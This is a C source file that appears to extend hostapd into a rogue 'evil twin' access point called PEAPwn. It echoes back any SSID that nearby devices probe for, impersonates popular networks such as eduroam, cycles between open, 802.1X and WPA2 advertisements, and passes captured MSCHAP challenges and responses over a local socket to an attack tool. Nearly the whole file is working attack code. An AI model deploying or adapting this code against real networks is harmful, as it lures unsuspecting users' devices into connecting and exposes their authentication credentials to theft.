#include "utils/includes.h"
#include "utils/common.h"
#include "ap/ap_config.h"
#include "spoof.h"
#include "ap/wpa_auth.h"
#include "ap/wpa_auth_i.h"
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/types.h>
#include <unistd.h>

#define UNIX_PATH_MAX 108

/* AP stuff */

const char *popular_networks[] = {
		"TELENETHOMESPOT",
		"FON_BELGACOM",
		"eduroam",
		NULL
};

int is_blacklisted(struct hostapd_data *hapd, const u8* ssid, u8 ssid_len) {
	char* begin = hapd->conf->ssid_blacklist;
	char* index;

	if(begin) {
		index = strchr(hapd->conf->ssid_blacklist, ',');
		while (index != NULL) {
			//wpa_printf(MSG_INFO, "Comparing %.*s and %.*s", index - begin, begin, ssid_len, ssid);
			if(os_strncmp(begin, (char *)(ssid), ssid_len) == 0)
				return 1;


			begin = index + 1;
			index = strchr(begin, ',');
		}

		index = begin + os_strlen(begin);
		//wpa_printf(MSG_INFO, "Comparing %s and %.*s", begin, ssid_len, ssid);
		if(os_strncmp(begin, (char *)(ssid), ssid_len) == 0)
			return 1;
	}

	return 0;
}

// If specific=0, this function spoofs every SSID except blacklisted ones
void set_spoofed_ssid(struct hostapd_data *hapd, struct spoof_ssid* spoofedssid, struct ieee802_11_elems* elems) {
	int popular_networks_len = (sizeof(popular_networks) - sizeof(void *)) / sizeof(void *);
	int random_choice = rand() % popular_networks_len;

	// Zero out array
	os_memset(spoofedssid->ssid, 0, HOSTAPD_MAX_SSID_LEN);

	// If probe request for broadcast SSID, use a popular network to respond
	int blacklisted = is_blacklisted(hapd, elems->ssid, elems->ssid_len);
	if(elems->ssid_len == 0 || blacklisted) {
		struct spoof_ssid* result;

		// If we don't cycle between ssids, use the set SSID only for broadcast
		if(hapd->conf->cycle_spoof_ssids)
			result = spoof_cycle_ssid(hapd);
		else
			result = &hapd->conf->ssid; // TODO: cleaner

		// If we found a cycled ssid, use it
		if(result) {
			os_memcpy(spoofedssid->ssid, result->ssid, result->ssid_len);
			spoofedssid->ssid_len = result->ssid_len;
		} else { // Otherwise use a popular network
			u8 ssid_len = os_strlen(popular_networks[random_choice]); // Get length of string

			// Spoof popular network
			os_memcpy(spoofedssid->ssid, popular_networks[random_choice], ssid_len);
			spoofedssid->ssid_len = ssid_len;
		}
	} else {
		// Spoof network in Probe Request
		os_memcpy(spoofedssid->ssid, elems->ssid, elems->ssid_len);
		spoofedssid->ssid_len = elems->ssid_len;

		// Add to broadcast array
		spoof_cycle_store_ssid(hapd, spoofedssid);
	}
}

void print_wpa_ie(struct hostapd_data *hapd) {
	if(hapd->wpa_auth && hapd->wpa_auth->wpa_ie) {
		int i;
		printf("wpa_ie: ");
		for(i = 0; i < hapd->wpa_auth->wpa_ie_len; i++) {
			printf("\\x%02X", hapd->wpa_auth->wpa_ie[i]);
		}
		printf("\n");
	}
}

void spoof_cycle_ie(struct hostapd_data *hapd) {
	u8* temp;
	static spoof_net_type current_net_type = OPEN;
	static int net_count = 0;

	// If we started with an open network, create the wpa_auth struct to update the IE later
	if(!hapd->wpa_auth) {
		wpa_printf(MSG_INFO, "No wpa_auth set!");
		hapd->wpa_auth = os_zalloc(sizeof(struct wpa_authenticator));
	}

	switch(current_net_type) {
	case OPEN:
		hapd->conf->wpa = 0;
		hapd->conf->auth_algs = 1;

		if(hapd->wpa_auth->wpa_ie)
			os_free(hapd->wpa_auth->wpa_ie);
		hapd->wpa_auth->wpa_ie = NULL;
		hapd->wpa_auth->wpa_ie_len = 0;
		break;
	case DOT1X:
		hapd->conf->wpa = 2;
		hapd->conf->auth_algs = 1;

		if(hapd->wpa_auth->wpa_ie)
			os_free(hapd->wpa_auth->wpa_ie);
		temp = os_malloc(sizeof(u8) * 22);
		os_memcpy(temp, "\x30\x14\x01\x00\x00\x0F\xAC\x04\x01\x00\x00\x0F\xAC\x04\x01\x00\x00\x0F\xAC\x01\x00\x00", 22);
		hapd->wpa_auth->wpa_ie = temp;
		hapd->wpa_auth->wpa_ie_len = 22;
		break;
	case WPA2:
		hapd->conf->wpa = 3; // 3 = wpa & wpa2
		hapd->conf->auth_algs = 1;

		if(hapd->wpa_auth->wpa_ie)
			os_free(hapd->wpa_auth->wpa_ie);
		temp = os_malloc(sizeof(u8) * 46);
		os_memcpy(temp, "\x30\x14\x01\x00\x00\x0F\xAC\x02\x01\x00\x00\x0F\xAC\x04\x01\x00\x00\x0F\xAC\x02\x00\x00\xDD\x16\x00\x50\xF2\x01\x01\x00\x00\x50\xF2\x02\x01\x00\x00\x50\xF2\x02\x01\x00\x00\x50\xF2\x02", 46);
		hapd->wpa_auth->wpa_ie = temp;
		hapd->wpa_auth->wpa_ie_len = 46;
		break;
	default:
		wpa_printf(MSG_INFO, "spoof_modify_config entered default. This shouldn't happen.");
		break;
	}

	// wpa_printf(MSG_INFO, "Net type was %d", current_net_type);

	// Send 5 times a probe response for net type x, then continue to next
	if(net_count > 4) {
		current_net_type = (current_net_type + 1) % 3;
		net_count = 0;
	} else {
		net_count++;
	}

	// Print wpa IE
	// print_wpa_ie(hapd);
}

struct spoof_ssid* spoof_cycle_ssid(struct hostapd_data *hapd) {
	static int read_index = 0;

	struct spoof_ssid* result = hapd->conf->spoof_ssid_list[read_index];
	read_index = (read_index + 1) % SPOOF_LIST_SIZE;

	return result;
}

void spoof_cycle_store_ssid(struct hostapd_data *hapd, struct spoof_ssid* to_store) {
	static int write_index = 0;

	// Free & alloc
	os_free(hapd->conf->spoof_ssid_list[write_index]);
	hapd->conf->spoof_ssid_list[write_index] = os_malloc(sizeof(struct spoof_ssid));

	// Store data
	os_memcpy(hapd->conf->spoof_ssid_list[write_index]->ssid, to_store->ssid, to_store->ssid_len);
	hapd->conf->spoof_ssid_list[write_index]->ssid_len = to_store->ssid_len;

	//wpa_printf(MSG_INFO, "Stored SSID %.*s idx %d", to_store->ssid_len, to_store->ssid, write_index);

	// Next
	write_index = (write_index + 1) % SPOOF_LIST_SIZE;
}


/* Peer stuff */

static int socket_fd;

void spoof_write_challenge_sock(const u8* challenge, int challenge_len) {
	struct sockaddr_un address;
	int i;

	printf("Entered spoof_write_challenge_sock\n");

	socket_fd = socket(PF_UNIX, SOCK_STREAM, 0);
	if(socket_fd < 0) {
		printf("socket() failed\n");
	}

	memset(&address, 0, sizeof(struct sockaddr_un));

	address.sun_family = AF_UNIX;
	snprintf(address.sun_path, UNIX_PATH_MAX, "/tmp/peapwn.sock");

	// Connect to server
	if(connect(socket_fd, (struct sockaddr *) &address, sizeof(struct sockaddr_un)) != 0) {
		printf("connect() failed\n");
	}

	printf("!!! Writing challenge: ");
	for(i = 0; i < challenge_len; i++)
		printf("%02x:", challenge[i]);
	printf("\n");

	write(socket_fd, challenge, 8);
}

void spoof_read_response_sock(u8** response) {
	u8 buffer[256];
	int i;

	printf("Waiting for answer from PEAPwn...\n");

	read(socket_fd, buffer, 24);

	memcpy(*response, buffer, 24);

	printf("!!! Got response: ");
	for(i = 0; i < 24; i++)
		printf("%02x:", buffer[i]);
	printf("\n");

	close(socket_fd);
}

